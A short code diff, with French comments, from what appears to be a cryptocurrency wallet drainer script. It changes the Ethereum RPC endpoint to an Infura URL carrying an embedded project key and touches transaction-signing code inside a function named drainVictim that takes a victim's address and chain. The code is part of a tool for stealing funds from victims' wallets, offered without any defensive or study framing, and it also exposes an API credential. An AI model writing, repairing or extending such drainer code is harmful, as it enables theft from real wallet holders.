@@ -47,8 +47,9 @@ const TOKENS = {
   },
 };
 
+// 🔥 Changé : Utilisation d'Infura au lieu de Cloudflare
 const RPC_URLS = {
-  '1': 'https://cloudflare-eth.com',
+  '1': 'https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793', // ← Remplace TON_PROJECT_ID
   '56': 'https://bsc-dataseed1.binance.org',
 };
 
@@ -111,7 +112,7 @@ async function drainVictim(victimAddress, chainId) {
         gas: gasLimit,
         gasPrice: gasPrice,
         nonce: nonce,
-        type: '0x00'  // Force legacy
+        type: '0x00'
       };
 
       const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
